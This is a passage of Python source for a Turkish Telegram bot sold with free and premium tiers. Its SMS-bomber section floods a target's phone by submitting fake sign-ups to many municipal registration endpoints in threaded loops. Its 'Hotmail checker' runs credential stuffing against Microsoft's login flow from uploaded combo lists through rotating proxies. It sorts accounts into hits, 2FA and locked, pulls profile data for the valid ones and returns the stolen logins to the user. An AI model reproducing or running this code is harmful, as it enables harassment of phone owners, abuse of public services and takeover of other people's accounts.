                data={"SahisUyelik.TCKimlikNo":self.tc,"SahisUyelik.DogumTarihi":"28.12.1999","SahisUyelik.Ad":"Memati","SahisUyelik.Soyad":"Bas","SahisUyelik.CepTelefonu":self.phone,"SahisUyelik.EPosta":self.mail,"SahisUyelik.Sifre":"Memati31","SahisUyelik.SifreyiDogrula":"Memati31","recaptchaValid":"true"}, verify=False, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Sancaktepe(self):
        try:
            r = requests.post("https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet",
                data={"SahisUyelik.TCKimlikNo":self.tc,"SahisUyelik.DogumTarihi":"13.01.2000","SahisUyelik.Ad":"MEMATİ","SahisUyelik.Soyad":"BAS","SahisUyelik.CepTelefonu":self.phone,"SahisUyelik.EPosta":self.mail,"SahisUyelik.Sifre":"Memati31","SahisUyelik.SifreyiDogrula":"Memati31","recaptchaValid":"true"}, verify=False, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Bayrampasa(self):
        try:
            r = requests.post("https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet",
                data={"SahisUyelik.TCKimlikNo":self.tc,"SahisUyelik.DogumTarihi":"07.06.2000","SahisUyelik.Ad":"MEMATİ","SahisUyelik.Soyad":"BAS","SahisUyelik.CepTelefonu":self.phone,"SahisUyelik.EPosta":self.mail,"SahisUyelik.Sifre":"Memati31","SahisUyelik.SifreyiDogrula":"Memati31","recaptchaValid":"true"}, verify=False, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass

def _get_sms_services():
    return [a for a in dir(SendSms) if callable(getattr(SendSms, a)) and not a.startswith('__') and a != 'adet']

def _sms_worker(phone, mail, mode, limit, interval, stop_event, uid, bot_instance):
    sms = SendSms(phone, mail)
    services = _get_sms_services()
    count = 0
    try:
        if mode == "turbo":
            while not stop_event.is_set():
                threads = []
                for fn in services:
                    if stop_event.is_set(): break
                    try:
                        t = threading.Thread(target=getattr(sms, fn), daemon=True)
                        threads.append(t); t.start()
                    except: pass
                for t in threads:
                    try: t.join(timeout=5)
                    except: pass
                count += len(services)
                with _SMS_LOCK:
                    if uid in _SMS_SESSIONS: _SMS_SESSIONS[uid]["count"] = count
        else:
            while not stop_event.is_set():
                for fn in services:
                    if stop_event.is_set(): break
                    if limit and count >= limit:
                        stop_event.set(); break
                    try:
                        getattr(sms, fn)()
                        count += 1
                        with _SMS_LOCK:
                            if uid in _SMS_SESSIONS: _SMS_SESSIONS[uid]["count"] = count
                    except: pass
                if interval > 0: stop_event.wait(interval)
    except Exception as e:
        print(f"[SMS WORKER] {e}")
    finally:
        with _SMS_LOCK:
            if uid in _SMS_SESSIONS:
                _SMS_SESSIONS[uid]["running"] = False
                _SMS_SESSIONS[uid]["count"] = count

def _launch_sms_bomb(uid, phone, mail, mode, limit, interval, bot_instance):
    with _SMS_LOCK:
        if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
            bot_instance.send_message(uid, "⚠️ Zaten aktif SMS bombardımanı var!\n/smsstop ile durdurun."); return
    stop_event = threading.Event()
    services = _get_sms_services()
    mode_txt = "🚀 Turbo" if mode == "turbo" else "⚡ Normal"
    limit_txt = str(limit) if limit else "Sonsuz ♾️"
    interval_txt = f"{interval}s" if mode == "normal" else "Maksimum Hız"
    bot_instance.send_message(uid,
        f"💣 <b>SMS Bomber Başladı!</b>\n📱 Hedef: <code>{phone}</code>\n"
        f"📊 Servis: <b>{len(services)}</b> API\n⚙️ Mod: <b>{mode_txt}</b>\n"
        f"🔢 Limit: <b>{limit_txt}</b>\n⏱ Aralık: <b>{interval_txt}</b>\n"
        f"🛑 Durdurmak için: /smsstop\n📊 Durum için: /smsstatus")
    t = threading.Thread(target=_sms_worker, args=(phone, mail, mode, limit, interval, stop_event, uid, bot_instance), daemon=True)
    with _SMS_LOCK:
        _SMS_SESSIONS[uid] = {"running":True,"thread":t,"event":stop_event,"count":0,
                              "target":phone,"mode":mode,
                              "start_time":datetime.now().strftime("%H:%M:%S"),
                              "services":len(services)}
    t.start()

def _sms_step1_number(msg, bot_instance):
    uid = msg.from_user.id
    phone = msg.text.strip()
    if not (phone.isdigit() and len(phone) == 10):
        bot_instance.reply_to(msg, "❌ Geçersiz numara! 10 haneli olmalı (başında 0 olmadan).\nÖrnek: 5306524123"); return
    m = bot_instance.reply_to(msg, f"📱 Hedef: <code>{phone}</code>\n📧 Mail adresi girin (bilmiyorsanız - gönderin):")
    bot_instance.register_next_step_handler(m, lambda m: _sms_step2_mail(m, phone, bot_instance))

def _sms_step2_mail(msg, phone, bot_instance):
    mail = msg.text.strip()
    if mail == "-": mail = ""
    if mail and ("@" not in mail or "." not in mail): mail = ""
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(InlineKeyboardButton("⚡ Normal Mod", callback_data=f"sms_normal_{phone}_{mail}"),
           InlineKeyboardButton("🚀 Turbo Mod", callback_data=f"sms_turbo_{phone}_{mail}"))
    bot_instance.reply_to(msg, f"📱 Hedef: <code>{phone}</code>\n📧 Mail: <code>{mail or 'Rastgele'}</code>\n⚙️ <b>Mod seçin:</b>", reply_markup=mk)

def _sms_normal_settings(msg, phone, mail, bot_instance):
    uid = msg.from_user.id
    try:
        parts = msg.text.strip().split()
        limit = int(parts[0]) if parts else 0
        interval = float(parts[1]) if len(parts) > 1 else 0
    except: limit = 0; interval = 0
    if limit < 0: limit = 0
    if interval < 0: interval = 0
    _launch_sms_bomb(uid, phone, mail, "normal", limit, interval, bot_instance)

# ══════════════════════════════════════════════════════════════
#  HOTMAIL CHECKER
# ══════════════════════════════════════════════════════════════
HOTMAIL_QUEUE = queue.Queue()
HOTMAIL_CURRENT_TASK = None
HOTMAIL_QUEUE_LOCK = threading.Lock()
HOTMAIL_QUEUE_RUNNING = False
HOTMAIL_QUEUE_THREAD = None
HOTMAIL_THREADS = 10
HOTMAIL_HIT = 0; HOTMAIL_BAD = 0; HOTMAIL_ERROR = 0; HOTMAIL_2FA = 0
HOTMAIL_REWARDS = 0; HOTMAIL_PROCESSED = 0
HOTMAIL_LOCK = threading.Lock()
HOTMAIL_KEYWORD_HITS = {}; HOTMAIL_COUNTRY_HITS = {}; HOTMAIL_START_TIME = None
PROXY_LIST = []; PROXY_INDEX = 0; PROXY_LOCK = threading.Lock()

COUNTRY_CODES = {"TR":"🇹🇷","US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","BR":"🇧🇷","AR":"🇦🇷",
                 "MX":"🇲🇽","TH":"🇹🇭","ES":"🇪🇸","IT":"🇮🇹","NL":"🇳🇱","RU":"🇷🇺","CN":"🇨🇳",
                 "JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","AU":"🇦🇺","CA":"🇨🇦","ZA":"🇿🇦"}

def get_country_flag(code): return COUNTRY_CODES.get(code.upper(), f"🌍 {code.upper()}")

def get_next_proxy():
    global PROXY_INDEX
    with PROXY_LOCK:
        if not PROXY_LIST: return None
        p = PROXY_LIST[PROXY_INDEX % len(PROXY_LIST)]
        PROXY_INDEX += 1
        return p

def _get_login_session(proxy=None):
    session = requests.Session()
    session.headers.update({
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language":"en-US,en;q=0.9","Accept-Encoding":"gzip, deflate, br",
        "DNT":"1","Connection":"keep-alive","Upgrade-Insecure-Requests":"1",
        "Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"none",
        "Sec-Fetch-User":"?1","Cache-Control":"max-age=0",
    })
    if proxy: session.proxies = {"http":proxy,"https":proxy}
    return session

def _extract_login_params(session, email):
    try:
        url = "https://login.live.com/oauth20_authorize.srf"
        params = {"client_id":"e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                  "redirect_uri":"https://login.live.com/oauth20_desktop.srf",
                  "response_type":"code","scope":"openid profile email",
                  "login_hint":email,"mkt":"en-US"}
        resp = session.get(url, params=params, timeout=15, allow_redirects=True)
        text = resp.text
        ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', text)
        ppft = ppft_match.group(1) if ppft_match else None
        url_post_match = re.search(r'urlPost:[\'"]?([^\'",}]+)', text)
        url_post = url_post_match.group(1) if url_post_match else "https://login.live.com/ppsecure/post.srf"
        flow_token_match = re.search(r'"sFT":"([^"]+)"', text)
        flow_token = flow_token_match.group(1) if flow_token_match else ppft
        sctx_match = re.search(r'"sCtx":"([^"]+)"', text)
        sctx = sctx_match.group(1) if sctx_match else ""
        cookies = session.cookies.get_dict()
        return {"success":True,"ppft":flow_token or ppft,"url_post":url_post,"sctx":sctx,
                "cookies":cookies,"text_sample":text[:500]}
    except Exception as e:
        return {"success": False, "error": str(e)}

def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
    for attempt in range(max_retries):
        session = _get_login_session(proxy)
        try:
            params = _extract_login_params(session, email)
            if not params["success"]:
                if attempt < max_retries - 1: time.sleep(1); continue
                return {"status":"error","detail":params.get("error","Param extraction failed")}
            ppft = params["ppft"]; url_post = params["url_post"]; cookies = params["cookies"]
            login_data = {"login":email,"loginfmt":email,"type":"11","LoginOptions":"3",
                          "passwd":password,"KMSI":"1","NewUser":"1","PPFT":ppft,"PPSX":"Pa",
                          "i13":"0","ps":"2","fspost":"0","CookieDisclosure":"0",
                          "IsFidoSupported":"1","isSignupPost":"0","isRecoveryAttemptPost":"0","i19":"0"}
            cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
            headers = {"Content-Type":"application/x-www-form-urlencoded","Origin":"https://login.live.com",
                       "Referer":"https://login.live.com/","Cookie":cookie_str}
            resp = session.post(url_post, data=login_data, headers=headers, timeout=20, allow_redirects=False)
            text = resp.text; headers_resp = resp.headers
            status_code = resp.status_code; location = headers_resp.get('Location','')
            if 'code=' in location or 'access_token' in location:
                token_info = _get_access_token_from_redirect(session, location)
                account_info = _get_account_info(token_info.get("token")) if token_info.get("token") else {}
                return {"status":"hit","email":email,"password":password,
                        "name":account_info.get("name","Bilinmiyor"),
                        "country":account_info.get("country","Bilinmiyor"),
                        "detail":"Login successful"}
            if any(x in text.lower() for x in ["two-step","2fa","authenticator","security code",
                "verify your identity","additional security","microsoft authenticator","enter code",
                "send code","proofup","mfa","two factor"]) or "proofup" in location.lower():
                return {"status":"2fa","email":email,"password":password,"detail":"2FA enabled"}
            if any(x in text.lower() for x in ["incorrect password","wrong password","doesn't exist",
                "account doesn't exist","invalid password","sign in error","that password is incorrect",
                "we couldn't find","account not found","doesn't look right","password is incorrect",
                "login failed"]) or status_code == 200 and "sSigninName" not in text:
                return {"status":"bad","email":email,"password":password,"detail":"Invalid credentials"}
            if any(x in text.lower() for x in ["captcha","recaptcha","challenge","verify you're human",
                "i'm not a robot","g-recaptcha"]):
                return {"status":"captcha","email":email,"password":password,"detail":"Captcha required"}
            if any(x in text.lower() for x in ["locked","suspended","blocked","temporarily locked",
                "unusual activity","security alert","account restricted"]):
                return {"status":"locked","email":email,"password":password,"detail":"Account locked"}
            return {"status":"error","email":email,"password":password,
                    "detail":f"Unknown response (status={status_code})","sample":text[:200]}
        except requests.exceptions.ProxyError as e:
            if attempt < max_retries - 1: time.sleep(1); continue
            return {"status":"error","detail":f"Proxy error: {str(e)}"}
        except requests.exceptions.Timeout:
            if attempt < max_retries - 1: time.sleep(2); continue
            return {"status":"error","detail":"Timeout"}
        except Exception as e:
            if attempt < max_retries - 1: time.sleep(1); continue
            return {"status":"error","detail":str(e)}
        finally: session.close()

def _get_access_token_from_redirect(session, location):
    try:
        if 'code=' in location:
            code = location.split('code=')[1].split('&')[0]
            token_url = "https://login.live.com/oauth20_token.srf"
            data = {"client_id":"e9b154d0-7658-433b-bb25-6b8e0a8a7c59","code":code,
                    "redirect_uri":"https://login.live.com/oauth20_desktop.srf",
                    "grant_type":"authorization_code"}
            resp = session.post(token_url, data=data, timeout=15)
            if resp.status_code == 200:
                jd = resp.json()
                return {"token":jd.get("access_token"),"refresh_token":jd.get("refresh_token"),"success":True}
            return {"success": False}
    except: return {"success": False}

def _get_account_info(access_token):
    if not access_token: return {}
    try:
        resp = requests.get("https://graph.microsoft.com/v1.0/me",
                            headers={"Authorization":f"Bearer {access_token}"}, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return {"name":data.get("displayName","Bilinmiyor"),
                    "email":data.get("mail") or data.get("userPrincipalName",""),
                    "country":data.get("country","Bilinmiyor"),
                    "job":data.get("jobTitle",""),"phone":data.get("mobilePhone","")}
        return {}
    except: return {}

@dataclass
class HotmailTask:
    user_id: int
    user_name: str
    combo_list: list
    thread_count: int
    status_msg_id: int
    chat_id: int
    is_premium: bool = False
    task_id: str = None
    queue_position: int = 0
    keywords: list = None
    def __post_init__(self):
        if not self.task_id: self.task_id = f"{self.user_id}_{datetime.now().strftime('%Y%m%d%H%M%S')}"
        if not self.keywords: self.keywords = get_user_keywords(self.user_id)

def hotmail_worker(combo_line, user_id, user_name, is_premium, keywords):
    global HOTMAIL_HIT, HOTMAIL_BAD, HOTMAIL_ERROR, HOTMAIL_2FA, HOTMAIL_REWARDS, HOTMAIL_PROCESSED
    global HOTMAIL_KEYWORD_HITS, HOTMAIL_COUNTRY_HITS
    try:
        if ":" not in combo_line:
            with HOTMAIL_LOCK: HOTMAIL_BAD += 1; HOTMAIL_PROCESSED += 1
            return
        email, password = combo_line.split(":", 1)
        email = email.strip(); password = password.strip()
        if not email or not password:
            with HOTMAIL_LOCK: HOTMAIL_BAD += 1; HOTMAIL_PROCESSED += 1
            return
        time.sleep(0.1)
        proxy = get_next_proxy()
        result = _check_hotmail_oauth(email, password, proxy=proxy, max_retries=3)
        status = result["status"]
        with HOTMAIL_LOCK:
            HOTMAIL_PROCESSED += 1
            if status == "hit":
                HOTMAIL_HIT += 1
                save_hotmail_log(user_id, user_name, email, password, "HIT", result.get("detail", ""))
                name = result.get("name", "Bilinmiyor")
                country = result.get("country", "Bilinmiyor")
                email_lower = email.lower()
                for kw in keywords:
                    if kw.lower() in email_lower:
                        HOTMAIL_KEYWORD_HITS[kw] = HOTMAIL_KEYWORD_HITS.get(kw, 0) + 1; break
                if '.' in email:
                    domain = email.split('.')[-1].upper()
                    if len(domain) == 2: HOTMAIL_COUNTRY_HITS[domain] = HOTMAIL_COUNTRY_HITS.get(domain, 0) + 1
                if "rewards" in email_lower or "microsoft" in email_lower: HOTMAIL_REWARDS += 1
                hit_line = f"{email}:{password}"
                if name != "Bilinmiyor": hit_line += f" | Name: {name}"
                if country != "Bilinmiyor": hit_line += f" | Country: {country}"
                with open(f"hits_{user_id}.txt", "a", encoding="utf-8") as f: f.write(hit_line + "\n")
                print(f"✅ HIT | {user_name} | {email}:{password}")
            elif status == "2fa":
                HOTMAIL_2FA += 1
                save_hotmail_log(user_id, user_name, email, password, "2FA", result.get("detail", ""))
            elif status == "captcha":
                HOTMAIL_ERROR += 1
                save_hotmail_log(user_id, user_name, email, password, "CAPTCHA", result.get("detail", ""))
            elif status == "locked":
                HOTMAIL_ERROR += 1
                save_hotmail_log(user_id, user_name, email, password, "LOCKED", result.get("detail", ""))
            elif status == "bad":
                HOTMAIL_BAD += 1
                save_hotmail_log(user_id, user_name, email, password, "BAD", result.get("detail", ""))
            else:
                HOTMAIL_ERROR += 1
                save_hotmail_log(user_id, user_name, email, password, "ERROR", result.get("detail", "Unknown"))
    except Exception as e:
        with HOTMAIL_LOCK: HOTMAIL_ERROR += 1; HOTMAIL_PROCESSED += 1
        print(f"⚠️ WORKER ERROR | {user_name} | {e}")

def hotmail_check(username, password):
    proxy = get_next_proxy()
    return _check_hotmail_oauth(username, password, proxy=proxy, max_retries=3)["status"]

def process_hotmail_queue():
    global HOTMAIL_CURRENT_TASK, HOTMAIL_QUEUE_RUNNING, main_bot
    global HOTMAIL_HIT, HOTMAIL_BAD, HOTMAIL_ERROR, HOTMAIL_2FA, HOTMAIL_REWARDS
    global HOTMAIL_KEYWORD_HITS, HOTMAIL_COUNTRY_HITS, HOTMAIL_START_TIME
    while HOTMAIL_QUEUE_RUNNING:
        try:
            try: task = HOTMAIL_QUEUE.get(timeout=5)
            except queue.Empty: continue
            HOTMAIL_START_TIME = time.time()
            HOTMAIL_HIT = 0; HOTMAIL_BAD = 0; HOTMAIL_ERROR = 0; HOTMAIL_2FA = 0
            HOTMAIL_KEYWORD_HITS = {}; HOTMAIL_COUNTRY_HITS = {}
            with HOTMAIL_QUEUE_LOCK:
                HOTMAIL_CURRENT_TASK = {"user_id":task.user_id,"user_name":task.user_name,
                                        "combo_list":task.combo_list,"is_premium":task.is_premium,
                                        "chat_id":task.chat_id,"status_msg_id":task.status_msg_id,
                                        "keywords":task.keywords}
            print(f"\n🚀 HOTMAIL BAŞLADI | {task.user_name} | {len(task.combo_list)} satır")
            try:
                if main_bot:
                    main_bot.edit_message_text(
                        f"🚀 **Hotmail Checker Başladı!**\n👤 {task.user_name}\n"
                        f"📂 Toplam: {len(task.combo_list)} satır\n⚙️ Thread: {task.thread_count}\n"
                        f"{'⭐ Premium' if task.is_premium else '🆓 Free'}\n"
                        f"📌 İlerleme: 0/{len(task.combo_list)}",
                        task.chat_id, task.status_msg_id)
            except: pass
            try:
                with ThreadPoolExecutor(max_workers=task.thread_count) as executor:
                    futures = []
                    for line in task.combo_list:
                        futures.append(executor.submit(hotmail_worker, line, task.user_id, task.user_name, task.is_premium, task.keywords))
                    processed = 0; total = len(task.combo_list)
                    for future in as_completed(futures):
                        processed += 1
                        try: future.result()
                        except: pass
                        if processed % 10 == 0 or processed == total:
                            try:
                                if main_bot:
                                    elapsed = int(time.time() - HOTMAIL_START_TIME)
                                    cpm = int(processed / (elapsed / 60)) if elapsed > 0 else 0
                                    main_bot.edit_message_text(
                                        f"🚀 **Hotmail Checker Çalışıyor**\n👤 {task.user_name}\n"
                                        f"📂 İlerleme: {processed}/{total} (%{int(processed/total*100)})\n"
                                        f"✅ Hit: {HOTMAIL_HIT} | ❌ Bad: {HOTMAIL_BAD}\n"
                                        f"🔐 2FA: {HOTMAIL_2FA} | ⚠️ Error: {HOTMAIL_ERROR}\n"
                                        f"⚙️ Thread: {task.thread_count} | ⚡️ CPM: {cpm}\n"
                                        f"{'⭐ Premium' if task.is_premium else '🆓 Free'}",
                                        task.chat_id, task.status_msg_id)
                            except: pass
            except: pass
            elapsed = int(time.time() - HOTMAIL_START_TIME)
            total = HOTMAIL_HIT + HOTMAIL_BAD + HOTMAIL_ERROR + HOTMAIL_2FA
            result_lines = [
                "✅ **Tarama Tamamlandı!**","━━━━━━━━━━━━━━━━━━━━━",
                f"📁 Dosya: hits_{task.user_id}.txt",f"📊 Toplam: {total}","",
                f"✅ HIT: {HOTMAIL_HIT}",f"🎁 Rewards Hits: {HOTMAIL_REWARDS}",
                f"🔐 2FA: {HOTMAIL_2FA}",f"❌ BAD: {HOTMAIL_BAD}",f"⚠️ ERROR: {HOTMAIL_ERROR}","",
                f"⏰ Süre: {elapsed} dk" if elapsed >= 60 else f"⏰ Süre: {elapsed} sn",
                f"⚡️ Ort. CPM: {int(total / (elapsed / 60)) if elapsed > 0 else 0}","",
                "🏷️ **KEYWORDS:**"]
            for kw, count in HOTMAIL_KEYWORD_HITS.items():
                pct = int((count / HOTMAIL_HIT) * 100) if HOTMAIL_HIT > 0 else 0
                result_lines.append(f"🎯 {kw}: {count} Hit (%{pct})")
            if not HOTMAIL_KEYWORD_HITS: result_lines.append("   ❌ Keyword eşleşmesi yok")
            result_lines.append(""); result_lines.append("🌍 **COUNTRIES:**")
            sorted_c = sorted(HOTMAIL_COUNTRY_HITS.items(), key=lambda x: x[1], reverse=True)[:10]
            for country, count in sorted_c:
                pct = int((count / HOTMAIL_HIT) * 100) if HOTMAIL_HIT > 0 else 0
                result_lines.append(f"{get_country_flag(country)} {country}: {count} Hit (%{pct})")
            if not sorted_c: result_lines.append("   ❌ Ülke bilgisi yok")
            result_lines.append(""); result_lines.append("📤 Sonuçlar gönderiliyor...")
            result_text = "\n".join(result_lines)
            try:
                if main_bot:
                    main_bot.edit_message_text(result_text, task.chat_id, task.status_msg_id)
                    hit_file = f"hits_{task.user_id}.txt"
                    if os.path.exists(hit_file) and os.path.getsize(hit_file) > 0:
                        with open(hit_file, "rb") as f:
                            main_bot.send_document(task.chat_id, f,
                                caption=f"✅ {HOTMAIL_HIT}x Hotmail Hit\n📊 Toplam Hit: {HOTMAIL_HIT}")
                        os.remove(hit_file)
            except: pass
            print(f"✅ TARAMA TAMAMLANDI | {task.user_name} | HIT: {HOTMAIL_HIT}")
            with HOTMAIL_QUEUE_LOCK: HOTMAIL_CURRENT_TASK = None
        except Exception as e:
            print(f"[QUEUE ERROR] {e}")
            with HOTMAIL_QUEUE_LOCK: HOTMAIL_CURRENT_TASK = None

def start_queue_processor():
    global HOTMAIL_QUEUE_RUNNING, HOTMAIL_QUEUE_THREAD
    if HOTMAIL_QUEUE_RUNNING: return
    HOTMAIL_QUEUE_RUNNING = True
    HOTMAIL_QUEUE_THREAD = threading.Thread(target=process_hotmail_queue, daemon=True)
    HOTMAIL_QUEUE_THREAD.start()

def add_to_queue(task):
    with HOTMAIL_QUEUE_LOCK:
        position = HOTMAIL_QUEUE.qsize() + 1
        if HOTMAIL_CURRENT_TASK: position += 1
        task.queue_position = position
        HOTMAIL_QUEUE.put(task)
        try:
            if main_bot:
                is_prem = task.is_premium
                limit_text = f"{PREMIUM_CHECK_LIMIT}" if is_prem else f"{FREE_CHECK_LIMIT}"
                main_bot.send_message(task.chat_id,
                    f"🚀 **Hotmail taraması sıraya alınıyor...**\n"
                    f"⏳ **Sıra Numaranız:** {position}\n"
                    f"⚠️ **Sebep:** {'⭐ Premium kullanıcı (Sınırsız)' if is_prem else f'🆓 Free kullanıcı ({FREE_CHECK_LIMIT} satır limit)'}\n"
                    f"📊 **Limit:** {limit_text} satır\n"
                    f"🔖 **Keyword Limit:** {get_keyword_limit_text(task.user_id)}")
        except: pass

def _process_hotmail_file(msg, bot_instance):
    uid = msg.from_user.id
    if not msg.document:
        bot_instance.reply_to(msg, "❌ Lütfen geçerli bir dosya gönderin!"); return
    try:
        file_info = bot_instance.get_file(msg.document.file_id)
        downloaded = bot_instance.download_file(file_info.file_path)
        combo_text = downloaded.decode("utf-8", errors="ignore")
        combo_list = [l.strip() for l in combo_text.splitlines() if l.strip() and ":" in l.strip()]
        if not combo_list:
            bot_instance.reply_to(msg, "❌ Dosyada geçerli combo bulunamadı!"); return
        is_prem = is_premium(uid)
        max_lines = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
        if len(combo_list) > max_lines:
            bot_instance.reply_to(msg,
                f"⚠️ **Dosya çok büyük!**\n📂 Dosyada {len(combo_list)} satır var.\n"
                f"📌 {'⭐ Premium' if is_prem else '🆓 Free'} limit: {max_lines} satır")
            return
        m = bot_instance.reply_to(msg, f"✅ **{len(combo_list)}** satır bulundu.\n"
            f"⚙️ Thread sayısını girin (10-100):\nVarsayılan: 10")
        bot_instance.register_next_step_handler(m, lambda m: _start_hotmail_scan_queue(m, combo_list, bot_instance))
    except Exception as e:
        bot_instance.reply_to(msg, f"❌ Dosya okunamadı: {e}")

def _start_hotmail_scan_queue(msg, combo_list, bot_instance):
    uid = msg.from_user.id
    global HOTMAIL_THREADS
    try:
        thread_count = int(msg.text.strip())
        if thread_count < 1: thread_count = 10
        elif thread_count > 100: thread_count = 100
    except: thread_count = 10
    HOTMAIL_THREADS = thread_count
    is_prem = is_premium(uid)
    user_name = get_user_name(uid)
    keywords = get_user_keywords(uid)
    start_queue_processor()
    status_msg = bot_instance.reply_to(msg,
        f"⏳ **Dosyanız sıraya alınıyor...**\n👤 {user_name}\n📂 {len(combo_list)} satır\n"
        f"⚙️ Thread: {thread_count}\n{'⭐ Premium' if is_prem else '🆓 Free'}\n"
        f"🔖 Keywordler: {', '.join(keywords)}")
    task = HotmailTask(user_id=uid, user_name=user_name, combo_list=combo_list,
                       thread_count=thread_count, status_msg_id=status_msg.message_id,
                       chat_id=msg.chat.id, is_premium=is_prem, keywords=keywords)
    add_to_queue(task)

def get_queue_status_text(user_id=None):
    with HOTMAIL_QUEUE_LOCK:
        lines = ["⏳ **BEKLEYEN SIRALAR (QUEUE)**","━━━━━━━━━━━━━━━━━━━━━"]
        if HOTMAIL_CURRENT_TASK:
            task = HOTMAIL_CURRENT_TASK
            prem = "⭐ PREMIUM" if task.get("is_premium") else "🆓 FREE"
            lines.append(f"  🔄 **[HOTMAIL] [{prem}] {task.get('user_name')} | İşleniyor ({len(task.get('combo_list', []))} satır)**")
        else: lines.append("  ⏸️ Şu an işlem yok")
        queue_list = list(HOTMAIL_QUEUE.queue)
        if queue_list:
            lines.append(""); lines.append(f"  📊 **Sırada Bekleyenler ({len(queue_list)})**"); lines.append("")
            for i, task in enumerate(queue_list, 1):
                prem = "⭐ PREMIUM" if task.is_premium else "🆓 FREE"
                lines.append(f"  {i}. **[HOTMAIL] [{prem}] {task.user_name} | ⏳ Sırada ({len(task.combo_list)} satır)**")
        else: lines.append("  📭 Sırada bekleyen yok")
        lines.append(""); lines.append("👨‍💻 @hackledin")
        return "\n".join(lines)

# ══════════════════════════════════════════════════════════════
#  HANDLERS
# ══════════════════════════════════════════════════════════════
main_bot = None

def register_handlers(bot_instance):
    global main_bot
    main_bot = bot_instance

    @bot_instance.message_handler(commands=["start"])
    def cmd_start(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\n❌ Bu botu kullanmanız yasaklanmıştır.\n📌 Sebep: {get_ban_reason(uid)}\n📞 İtiraz için: @hackledin")
            return
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        mk = InlineKeyboardMarkup(row_width=3)
        mk.add(_btn("🇹🇷 Türkçe","lang_tr"), _btn("🇬🇧 English","lang_en"), _btn("🇸🇦 العربية","lang_ar"))
        bot_instance.reply_to(msg, s(uid, "lang_pick"), reply_markup=mk)

    @bot_instance.message_handler(commands=["premium"])
    def cmd_premium(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}"); return
        if is_premium(uid):
            bot_instance.reply_to(msg, s(uid, "already_premium")); return
        txt = (f"{s(uid,'premium_title')}\n━━━━━━━━━━━━━━━━━━━━━\n"
               f"{s(uid,'premium_price_txt',price=PREMIUM_PRICE)}\n"
               f"{s(uid,'premium_dur')}\n{s(uid,'premium_features')}")
        bot_instance.reply_to(msg, txt, reply_markup=premium_kb(uid))

    @bot_instance.message_handler(commands=["hotmail"])
    def cmd_hotmail(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}"); return
        user_name = get_user_name(uid); keywords = get_user_keywords(uid)
        limit_text = get_keyword_limit_text(uid); is_prem = is_premium(uid)
        capture_left = get_capture_limit_text(uid)
        bot_instance.reply_to(msg,
            f"📧 **HOTMAIL CHECKER & CAPTURE**\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Kullanıcı: {user_name}\n🔖 Keyword: {', '.join(keywords)}\n"
            f"📊 Keyword Limit: {limit_text}\n"
            f"📧 Hotmail: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({FREE_CHECK_LIMIT} satır)'}\n"
            f"📸 Capture: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({capture_left} kaldı)'}\n"
            f"📌 Aşağıdaki menüden işlem yapın:",
            reply_markup=hotmail_keyboard(uid))

    @bot_instance.message_handler(commands=["queue","sıra"])
    def cmd_queue_status(msg):
        bot_instance.reply_to(msg, get_queue_status_text(msg.from_user.id))

    @bot_instance.message_handler(commands=["profil"])
    def cmd_profile(msg):
        _show_profile(msg.chat.id, msg.from_user.id, bot_instance)

    @bot_instance.message_handler(commands=["istatistik"])
    def cmd_stats_detailed(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}"); return
        tu, prem_pu, osint_pu, tc, tch = get_bot_stats()
        bot_instance.reply_to(msg,
            f"📊 **SİSTEM İSTATİSTİKLERİ**\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 Toplam Kullanıcı: {tu}\n📧 Hotmail Premium: {prem_pu or 0}\n"
            f"🌍 OSINT Premium: {osint_pu or 0}\n📦 Toplam Combo: {tc or 0}\n"
            f"🔍 Toplam Sorgu: {tch or 0}\n👨‍💻 @hackledin")

    @bot_instance.message_handler(commands=["tgid","telegramid","tgsorgu"])
    def cmd_tgid(msg):
        uid = msg.from_user.id
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}"); return
        free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))
        balance = tgid_get_balance(uid)
        if uid == ADMIN_ID: durum = "👑 Admin — Sınırsız"
        elif is_premium(uid): durum = "⭐ Premium — Sınırsız"
        else: durum = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT}  |  💰 Bakiye: {balance}"
        txt = (f"🆔 <b>TELEGRAM ID SORGU</b>\n━━━━━━━━━━━━━━━━━━━━━\n📊 {durum}\n\n"
